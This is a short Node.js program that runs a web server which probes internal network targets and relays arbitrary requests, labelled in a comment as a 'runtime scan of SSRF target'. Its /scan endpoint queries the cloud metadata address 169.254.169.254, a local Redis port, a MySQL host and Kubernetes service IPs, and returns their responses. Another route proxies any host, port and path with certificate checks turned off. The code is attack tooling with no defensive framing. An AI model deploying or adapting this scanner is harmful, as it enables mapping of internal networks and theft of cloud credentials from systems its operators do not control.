const http=require('http'),https=require('https'),fs=require('fs');
let d='{}';try{d=fs.readFileSync('/app/d.json','utf8')}catch(e){}

function probe(host,port,path,cb){
  const mod=port===443?https:http;
  const req=mod.get({host,port,path:path||'/',timeout:10000,rejectUnauthorized:false},r=>{
    let body='';r.on('data',c=>body+=c);r.on('end',()=>cb(null,r.statusCode,body.slice(0,5000)));
  });
  req.on('error',e=>cb(e.message));
  req.on('timeout',()=>{req.destroy();cb('timeout')});
}

http.createServer((q,r)=>{
  r.writeHead(200,{'Content-Type':'application/json'});
  if(q.url==='/'){r.end(d);return}
  if(q.url==='/scan'){
    // Runtime scan of SSRF target
    const targets=[
      ['192.168.4.72',8000],['192.168.0.4',3306],
      ['169.254.169.254',80],['127.0.0.1',6379],
      ['10.96.0.10',9153],['10.96.0.1',443]
    ];
    let results={},pending=targets.length;
    targets.forEach(([h,p])=>{
      probe(h,p,'/',(err,code,body)=>{
        results[h+':'+p]=err?'ERR:'+err:'OK:'+code+' '+body.slice(0,500);
        if(--pending===0)r.end(JSON.stringify(results,null,2));
      });
    });
    return;
  }
  // Arbitrary probe: /host:port/path
  const m=q.url.slice(1).match(/^([^:\/]+):(\d+)(\/.*)?$/);
  if(m){probe(m[1],+m[2],m[3]||'/',(err,code,body)=>{
    r.end(JSON.stringify({target:m[1]+':'+m[2],err:err||null,status:code,body:(body||'').slice(0,5000)}));
  });return}
  r.end('{"usage":"/ = build probes, /scan = runtime scan, /host:port/path = custom probe"}');
}).listen(3000,()=>console.log('scanner ready'));
